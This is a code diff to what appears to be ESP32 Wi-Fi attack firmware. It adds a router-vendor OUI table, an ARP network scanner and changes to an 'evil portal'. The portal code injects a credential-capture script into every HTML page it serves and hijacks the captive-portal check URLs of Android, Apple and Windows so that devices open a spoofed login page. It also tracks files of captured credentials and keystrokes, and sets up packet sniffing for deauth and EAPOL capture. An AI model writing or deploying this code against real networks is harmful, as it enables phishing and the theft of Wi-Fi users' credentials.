+    {"001BFC", COMPANY_ASUS}, {"001D60", COMPANY_ASUS}, {"001E8C", COMPANY_ASUS}, {"001FC6", COMPANY_ASUS}, {"002215", COMPANY_ASUS}, {"002354", COMPANY_ASUS}, {"00248C", COMPANY_ASUS}, {"002618", COMPANY_ASUS}, {"00E018", COMPANY_ASUS},
+    {"04421A", COMPANY_ASUS}, {"049226", COMPANY_ASUS}, {"04D4C4", COMPANY_ASUS}, {"04D9F5", COMPANY_ASUS}, {"08606E", COMPANY_ASUS}, {"086266", COMPANY_ASUS}, {"08BFB8", COMPANY_ASUS}, {"0C9D92", COMPANY_ASUS}, {"107B44", COMPANY_ASUS},
+    {"107C61", COMPANY_ASUS}, {"10BF48", COMPANY_ASUS}, {"10C37B", COMPANY_ASUS}, {"14DAE9", COMPANY_ASUS}, {"14DDA9", COMPANY_ASUS}, {"1831BF", COMPANY_ASUS}, {"1C872C", COMPANY_ASUS}, {"1CB72C", COMPANY_ASUS}, {"20CF30", COMPANY_ASUS},
+    {"244BFE", COMPANY_ASUS}, {"2C4D54", COMPANY_ASUS}, {"2C56DC", COMPANY_ASUS}, {"2CFDA1", COMPANY_ASUS}, {"305A3A", COMPANY_ASUS}, {"3085A9", COMPANY_ASUS}, {"3497F6", COMPANY_ASUS}, {"382C4A", COMPANY_ASUS}, {"38D547", COMPANY_ASUS},
+    {"3C7C3F", COMPANY_ASUS}, {"40167E", COMPANY_ASUS}, {"40B076", COMPANY_ASUS}, {"485B39", COMPANY_ASUS}, {"4CEDFB", COMPANY_ASUS}, {"50465D", COMPANY_ASUS}, {"50EBF6", COMPANY_ASUS}, {"5404A6", COMPANY_ASUS}, {"54A050", COMPANY_ASUS},
+    {"581122", COMPANY_ASUS}, {"6045CB", COMPANY_ASUS}, {"60A44C", COMPANY_ASUS}, {"60CF84", COMPANY_ASUS}, {"704D7B", COMPANY_ASUS}, {"708BCD", COMPANY_ASUS}, {"74D02B", COMPANY_ASUS}, {"7824AF", COMPANY_ASUS}, {"7C10C9", COMPANY_ASUS},
+    {"88D7F6", COMPANY_ASUS}, {"90E6BA", COMPANY_ASUS}, {"9C5C8E", COMPANY_ASUS}, {"A036BC", COMPANY_ASUS}, {"A85E45", COMPANY_ASUS}, {"AC220B", COMPANY_ASUS}, {"AC9E17", COMPANY_ASUS}, {"B06EBF", COMPANY_ASUS}, {"BCAEC5", COMPANY_ASUS},
+    {"BCEE7B", COMPANY_ASUS}, {"C86000", COMPANY_ASUS}, {"C87F54", COMPANY_ASUS}, {"CC28AA", COMPANY_ASUS}, {"D017C2", COMPANY_ASUS}, {"D45D64", COMPANY_ASUS}, {"D850E6", COMPANY_ASUS}, {"E03F49", COMPANY_ASUS}, {"E0CB4E", COMPANY_ASUS},
+    {"E89C25", COMPANY_ASUS}, {"F02F74", COMPANY_ASUS}, {"F07959", COMPANY_ASUS}, {"F46D04", COMPANY_ASUS}, {"F832E4", COMPANY_ASUS}, {"FC3497", COMPANY_ASUS}, {"FCC233", COMPANY_ASUS},
+    {"000FB3", COMPANY_ACTIONTEC}, {"001505", COMPANY_ACTIONTEC}, {"001801", COMPANY_ACTIONTEC}, {"001EA7", COMPANY_ACTIONTEC}, {"001F90", COMPANY_ACTIONTEC}, {"0020E0", COMPANY_ACTIONTEC},
+    {"00247B", COMPANY_ACTIONTEC}, {"002662", COMPANY_ACTIONTEC}, {"0026B8", COMPANY_ACTIONTEC}, {"007F28", COMPANY_ACTIONTEC}, {"0C6127", COMPANY_ACTIONTEC}, {"105F06", COMPANY_ACTIONTEC},
+    {"10785B", COMPANY_ACTIONTEC}, {"109FA9", COMPANY_ACTIONTEC}, {"181BEB", COMPANY_ACTIONTEC}, {"207600", COMPANY_ACTIONTEC}, {"408B07", COMPANY_ACTIONTEC}, {"4C8B30", COMPANY_ACTIONTEC},
+    {"5C35FC", COMPANY_ACTIONTEC}, {"7058A4", COMPANY_ACTIONTEC}, {"70F196", COMPANY_ACTIONTEC}, {"70F220", COMPANY_ACTIONTEC}, {"84E892", COMPANY_ACTIONTEC}, {"941C56", COMPANY_ACTIONTEC},
+    {"9C1E95", COMPANY_ACTIONTEC}, {"A0A3E2", COMPANY_ACTIONTEC}, {"A83944", COMPANY_ACTIONTEC}, {"E86FF2", COMPANY_ACTIONTEC}, {"F8E4FB", COMPANY_ACTIONTEC}, {"FC2BB2", COMPANY_ACTIONTEC},
+};
+
 // Function to match the BSSID to a company based on OUI
 ECompany match_bssid_to_company(const uint8_t *bssid) {
-    char oui[7]; // First 3 bytes of the BSSID
+    char oui[7];
     snprintf(oui, sizeof(oui), "%02X%02X%02X", bssid[0], bssid[1], bssid[2]);
 
-    // Check D-Link
-    for (int i = 0; i < sizeof(dlink_ouis) / sizeof(dlink_ouis[0]); i++) {
-        if (strcmp(oui, dlink_ouis[i]) == 0) {
-            return COMPANY_DLINK;
+    for (size_t i = 0; i < sizeof(OUI_MAP) / sizeof(OUI_MAP[0]); i++) {
+        if (strcmp(oui, OUI_MAP[i].oui) == 0) {
+            return OUI_MAP[i].company;
         }
     }
 
-    // Check Netgear
-    for (int i = 0; i < sizeof(netgear_ouis) / sizeof(netgear_ouis[0]); i++) {
-        if (strcmp(oui, netgear_ouis[i]) == 0) {
-            return COMPANY_NETGEAR;
-        }
-    }
-
-    // Check Belkin
-    for (int i = 0; i < sizeof(belkin_ouis) / sizeof(belkin_ouis[0]); i++) {
-        if (strcmp(oui, belkin_ouis[i]) == 0) {
-            return COMPANY_BELKIN;
-        }
-    }
-
-    // Check TP-Link
-    for (int i = 0; i < sizeof(tplink_ouis) / sizeof(tplink_ouis[0]); i++) {
-        if (strcmp(oui, tplink_ouis[i]) == 0) {
-            return COMPANY_TPLINK;
-        }
-    }
-
-    // Check Linksys
-    for (int i = 0; i < sizeof(linksys_ouis) / sizeof(linksys_ouis[0]); i++) {
-        if (strcmp(oui, linksys_ouis[i]) == 0) {
-            return COMPANY_LINKSYS;
-        }
-    }
-
-    // Check ASUS
-    for (int i = 0; i < sizeof(asus_ouis) / sizeof(asus_ouis[0]); i++) {
-        if (strcmp(oui, asus_ouis[i]) == 0) {
-            return COMPANY_ASUS;
-        }
-    }
-
-    // Check Actiontec
-    for (int i = 0; i < sizeof(actiontec_ouis) / sizeof(actiontec_ouis[0]); i++) {
-        if (strcmp(oui, actiontec_ouis[i]) == 0) {
-            return COMPANY_ACTIONTEC;
-        }
-    }
-
-    // Unknown company if no match found
     return COMPANY_UNKNOWN;
 }
 
@@ -579,11 +730,13 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
             station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
             ssid_str, // Use SSID here
             ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid
-        TERMINAL_VIEW_ADD_TEXT(
+        char station_log_buf[256];
+        snprintf(station_log_buf, sizeof(station_log_buf),
             "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
             station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
             ssid_str, // Use SSID here
             ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid
+        TERMINAL_VIEW_ADD_TEXT(station_log_buf);
 
         // Add the station and the *specific AP BSSID* it was seen with to the list
         add_station_ap_pair(station_mac, ap_bssid);
@@ -618,6 +771,10 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 printf("Error: send chunk failed\n");
                 break;
             }
+        }
+        // Inject capture JS if serving HTML
+        if (content_type && strcmp(content_type, "text/html") == 0) {
+            httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         }
 
         free(buffer);
@@ -819,11 +976,29 @@ esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
     ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
+    // Debug buffer state
+    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Prefer buffered HTML over default embedded portal when available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
+        httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
+        ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
+        return ESP_OK;
+    }
+
     // Check if we should serve the default embedded portal
     if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
         httpd_resp_set_type(req, "text/html");
-        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
-        ESP_LOGI(TAG, "Served default embedded portal.");
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
+        httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
         ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
     }
@@ -927,12 +1102,21 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
     const char *uri = req->uri;
-    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
-        httpd_resp_set_status(req, "301 Moved Permanently");
-        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
-        httpd_resp_send(req, NULL, 0);
+    if (
+        strcmp(uri, "/generate_204") == 0 ||
+        strcmp(uri, "/gen_204") == 0 ||
+        strcmp(uri, "/hotspot-detect.html") == 0 ||
+        strcmp(uri, "/connecttest.txt") == 0 ||
+        strcmp(uri, "/ncsi.txt") == 0 ||
+        strcmp(uri, "/success.txt") == 0 ||
+        strcmp(uri, "/library/test/success.html") == 0 ||
+        strcmp(uri, "/success.html") == 0 ||
+        strcmp(uri, "/") == 0 ||
+        strcmp(uri, "/redirect") == 0
+    ) {
+        esp_err_t r = portal_handler(req);
         ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
-        return ESP_OK;
+        return r;
     }
     // minimal logging for captive probe
 
@@ -946,7 +1130,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    httpd_resp_set_status(req, "301 Moved Permanently");
+    httpd_resp_set_status(req, "302 Found");
     char LocationRedir[512];
     snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
     httpd_resp_set_hdr(req, "Location", LocationRedir);
@@ -955,9 +1139,20 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+    } else {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html");
+    }
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 15;
+    config.max_uri_handlers = 32;
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
     config.stack_size = 8192;
@@ -965,11 +1160,25 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_head = {.uri = "/library/test/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_get = {.uri = "/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_head = {.uri = "/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_get = {.uri = "/redirect", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
@@ -984,10 +1193,24 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_android_get);
         httpd_register_uri_handler(evilportal_server, &portal_android_head);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_head);
         httpd_register_uri_handler(evilportal_server, &portal_apple_get);
         httpd_register_uri_handler(evilportal_server, &portal_apple_head);
+        httpd_register_uri_handler(evilportal_server, &portal_root_get);
+        httpd_register_uri_handler(evilportal_server, &portal_root_head);
         httpd_register_uri_handler(evilportal_server, &microsoft_get);
         httpd_register_uri_handler(evilportal_server, &microsoft_head);
+        httpd_register_uri_handler(evilportal_server, &ncsi_get);
+        httpd_register_uri_handler(evilportal_server, &ncsi_head);
+        httpd_register_uri_handler(evilportal_server, &success_get);
+        httpd_register_uri_handler(evilportal_server, &success_head);
+        httpd_register_uri_handler(evilportal_server, &lib_success_get);
+        httpd_register_uri_handler(evilportal_server, &lib_success_head);
+        httpd_register_uri_handler(evilportal_server, &success_html_get);
+        httpd_register_uri_handler(evilportal_server, &success_html_head);
+        httpd_register_uri_handler(evilportal_server, &redirect_get);
+        httpd_register_uri_handler(evilportal_server, &redirect_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
@@ -1009,6 +1232,18 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     login_done = false; // Reset login state on start
     current_creds_filename[0] = '\0'; // Reset filenames at the start
     current_keystrokes_filename[0] = '\0';
+    // Log HTML buffer state at portal startup
+    ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
+        html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Log first 100 characters of captured HTML if available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+    char preview[101];
+    size_t preview_len = html_buffer_size > 100 ? 100 : html_buffer_size;
+    memcpy(preview, html_buffer, preview_len);
+    preview[preview_len] = '\0';
+    ESP_LOGI(TAG, "Captured HTML preview (first %zu chars): %.100s", preview_len, preview);
+    }
 
     // Generate indexed filenames if SD card is available
     if (sd_card_manager.is_initialized) {
@@ -1118,6 +1353,8 @@ void wifi_manager_stop_evil_portal() {
     login_done = false; // Reset login state on stop
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
+    
+    // Keep HTML buffer across portal restarts - don't clear it here
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -1134,9 +1371,40 @@ void wifi_manager_stop_evil_portal() {
     ap_manager_init();
 }
 
-void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
+bool wifi_manager_is_evil_portal_active(void) {
+    return evilportal_server != NULL;
+}
 
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
+void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+
+    // Set hardware-level promiscuous filter based on callback type
+    wifi_promiscuous_filter_t filter = {0};
+    
+    // Determine filter mask based on callback function
+    if (callback == wifi_beacon_scan_callback || callback == wifi_probe_scan_callback || 
+        callback == wifi_deauth_scan_callback || callback == wifi_pwn_scan_callback ||
+        callback == wifi_wps_detection_callback || callback == wifi_listen_probes_callback ||
+        callback == wifi_pineap_detector_callback || callback == wardriving_scan_callback) {
+        // Management frames only
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    } else if (callback == wifi_eapol_scan_callback) {
+        // Data frames only for EAPOL
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    } else if (callback == sae_monitor_callback) {
+        // Management frames for SAE
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    } else {
+        // Default: capture all frame types (for raw capture, etc.)
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
+    }
+    
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
+    ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02" PRIx32, filter.filter_mask);
 
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
 
@@ -1161,9 +1429,17 @@ void wifi_manager_stop_monitor_mode() {
 
 void wifi_manager_init(void) {
 
+    // --- Memory check before WiFi init ---
+    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    if (free_heap < (45 * 1024)) {
+        ESP_LOGW(TAG, "WARNING: Less than 45KB of free RAM available (%d bytes). WiFi may fail to initialize or operate reliably!", (int)free_heap);
+        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB RAM free (%d bytes). WiFi may not initialize or operate reliably!\n", (int)free_heap);
+    }
+
     esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings
 
-    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+    // Disable WiFi power saving to improve connection stability
+    esp_wifi_set_ps(WIFI_PS_NONE);
 
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
@@ -1233,6 +1509,13 @@ void wifi_manager_init(void) {
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
     // Start the Wi-Fi AP
     ESP_ERROR_CHECK(esp_wifi_start());
+    
+    // Additional WiFi stability settings
+    // Set maximum TX power to improve signal strength
+    esp_wifi_set_max_tx_power(78); // 19.5 dBm (78/4)
+    
+    // Set connection timeout to be more lenient
+    esp_wifi_set_inactive_time(WIFI_IF_STA, 60); // 60 seconds before considering connection inactive
 
     // Initialize global CA certificate store
     ret = esp_crt_bundle_attach(NULL);
@@ -1240,6 +1523,45 @@ void wifi_manager_init(void) {
         printf("Global CA certificate store initialized successfully.\n");
     } else {
         printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
+    }
+}
+
+void wifi_manager_configure_sta_from_settings(void) {
+    // Configure STA with saved credentials for boot-time connection
+    const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
+    const char *saved_password = settings_get_sta_password(&G_Settings);
+    if (saved_ssid && strlen(saved_ssid) > 0) {
+        wifi_config_t sta_config = {
+            .sta = {
+                .threshold.authmode = (saved_password && strlen(saved_password) > 0) ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
+                .pmf_cfg = {.capable = true, .required = false},
+            },
+        };
+        
+        strlcpy((char *)sta_config.sta.ssid, saved_ssid, sizeof(sta_config.sta.ssid));
+        if (saved_password) {
+            strlcpy((char *)sta_config.sta.password, saved_password, sizeof(sta_config.sta.password));
+        }
+        
+        esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_config);
+        if (err == ESP_OK) {
+            printf("STA configured with saved credentials: %s\n", saved_ssid);
+            
+            // Mark that we've attempted boot connection and try to connect
+            boot_connection_attempted = true;
+            printf("Attempting boot-time connection to: %s\n", saved_ssid);
+            TERMINAL_VIEW_ADD_TEXT("Connecting to saved network: %s\n", saved_ssid);
+            
+            esp_err_t connect_err = esp_wifi_connect();
+            if (connect_err != ESP_OK) {
+                printf("Failed to initiate connection: %s\n", esp_err_to_name(connect_err));
+                TERMINAL_VIEW_ADD_TEXT("Failed to connect to saved network\n");
+            }
+        } else {
+            printf("Failed to configure STA: %s\n", esp_err_to_name(err));
+        }
+    } else {
+        printf("No saved WiFi credentials found\n");
     }
 }
 
@@ -1969,6 +2291,9 @@ void animate_led_based_on_amplitude(void *pvParameters) {
     float last_amplitude = 0.0f;
     float smoothing_factor = 0.1f;
     int hue = 0;
+    
+    uint32_t last_error_time = 0;
+    const uint32_t error_rate_limit_ms = 5000;
 
     while (1) {
         struct sockaddr_in source_addr;
@@ -2198,6 +2523,327 @@ scanner_ctx_t *scanner_init(void) {
     return ctx;
 }
 
+arp_scanner_ctx_t *arp_scanner_init(void) {
+    arp_scanner_ctx_t *ctx = malloc(sizeof(arp_scanner_ctx_t));
+    if (!ctx) {
+        return NULL;
+    }
+
+    ctx->max_hosts = END_HOST - START_HOST + 1;
+    ctx->hosts = malloc(sizeof(arp_host_t) * ctx->max_hosts);
+    if (!ctx->hosts) {
+        free(ctx);
+        return NULL;
+    }
+
+    ctx->num_active_hosts = 0;
+    memset(ctx->subnet_prefix, 0, sizeof(ctx->subnet_prefix));
+    return ctx;
+}
+
+void arp_scanner_cleanup(arp_scanner_ctx_t *ctx) {
+    if (ctx) {
+        if (ctx->hosts) {
+            free(ctx->hosts);
+        }
+        free(ctx);
+    }
+}
+
+bool send_arp_request(const char *target_ip) {
+    if (!target_ip) {
+        ESP_LOGW(TAG, "send_arp_request: target_ip is NULL");
+        return false;
+    }
+
+    ESP_LOGD(TAG, "Sending ARP request to %s", target_ip);
+    
+    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!netif) {
+        ESP_LOGW(TAG, "send_arp_request: Failed to get WiFi STA interface");
+        return false;
+    }
+
+    // Get our own IP and MAC
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
+        return false;
+    }
+
+    uint8_t our_mac[6];
+    if (esp_netif_get_mac(netif, our_mac) != ESP_OK) {
+        return false;
+    }
+
+    // Parse target IP
+    esp_ip4_addr_t target_addr;
+    if (inet_pton(AF_INET, target_ip, &target_addr) != 1) {
+        return false;
+    }
+
+    // Create ARP request packet
+    uint8_t arp_packet[42] = {
+        // Ethernet header
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
+        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5], // Source MAC
+        0x08, 0x06, // EtherType (ARP)
+        
+        // ARP header
+        0x00, 0x01, // Hardware type (Ethernet)
+        0x08, 0x00, // Protocol type (IPv4)
+        0x06,       // Hardware address length
+        0x04,       // Protocol address length
+        0x00, 0x01, // Operation (ARP request)
+        
+        // Sender hardware address (our MAC)
+        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5],
+        
+        // Sender protocol address (our IP)
+        (ip_info.ip.addr >> 0) & 0xFF,
+        (ip_info.ip.addr >> 8) & 0xFF,
+        (ip_info.ip.addr >> 16) & 0xFF,
+        (ip_info.ip.addr >> 24) & 0xFF,
+        
+        // Target hardware address (unknown, all zeros)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        
+        // Target protocol address (target IP)
+        (target_addr.addr >> 0) & 0xFF,
+        (target_addr.addr >> 8) & 0xFF,
+        (target_addr.addr >> 16) & 0xFF,
+        (target_addr.addr >> 24) & 0xFF
+    };
+
+    // Send raw ARP packet using esp_wifi_80211_tx with retry logic
+    ESP_LOGD(TAG, "Sending ARP packet to %s via esp_wifi_80211_tx", target_ip);
+    
+    esp_err_t err = ESP_FAIL;
+    int retry_count = 0;
+    const int max_retries = 3;
+    
+    while (retry_count < max_retries) {
+        err = esp_wifi_80211_tx(WIFI_IF_STA, arp_packet, sizeof(arp_packet), false);
+        
+        if (err == ESP_OK) {
+            ESP_LOGD(TAG, "ARP packet sent successfully to %s", target_ip);
+            return true;
+        } else if (err == ESP_ERR_NO_MEM) {
+            // WiFi buffer exhaustion - wait and retry
+            retry_count++;
+            ESP_LOGD(TAG, "WiFi buffer full for %s, retry %d/%d", target_ip, retry_count, max_retries);
+            vTaskDelay(pdMS_TO_TICKS(10)); // Wait 10ms before retry
+        } else {
+            // Other error - don't retry
+            ESP_LOGW(TAG, "Failed to send ARP packet to %s: %s", target_ip, esp_err_to_name(err));
+            break;
+        }
+    }
+    
+    if (err == ESP_ERR_NO_MEM) {
+        ESP_LOGW(TAG, "Failed to send ARP packet to %s after %d retries: WiFi buffers exhausted", target_ip, max_retries);
+    }
+    
+    return false;
+}
+
+// Alternative ARP resolution using ICMP ping to trigger ARP
+bool trigger_arp_via_ping(const char *ip) {
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(ip);
+    
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) {
+        // Try UDP socket as fallback
+        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sock < 0) {
+            return false;
+        }
+        dest_addr.sin_port = htons(53); // DNS port
+        
+        // Set non-blocking and short timeout
+        int flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+        
+        // Try to connect to trigger ARP resolution
+        connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        close(sock);
+        return true;
+    }
+    
+    close(sock);
+    return true;
+}
+
+bool send_arp_request_lwip(const char *target_ip) {
+    if (!target_ip) {
+        return false;
+    }
+
+    // Parse target IP
+    ip4_addr_t target_addr;
+    if (!ip4addr_aton(target_ip, &target_addr)) {
+        return false;
+    }
+
+    // Get STA network interface
+    struct netif *netif = netif_default;
+    if (!netif) {
+        ESP_LOGW(TAG, "netif_default is NULL");
+        return false;
+    }
+
+    // Send ARP request using lwIP
+    err_t result = etharp_request(netif, &target_addr);
+    return (result == ERR_OK);
+}
+
+bool get_arp_table_entry(const char *ip, uint8_t *mac) {
+    if (!ip || !mac) {
+        return false;
+    }
+
+    // Parse target IP
+    ip4_addr_t target_addr;
+    if (!ip4addr_aton(ip, &target_addr)) {
+        return false;
+    }
+
+    // Search ARP table using NULL netif (searches all interfaces)
+    struct eth_addr *eth_ret = NULL;
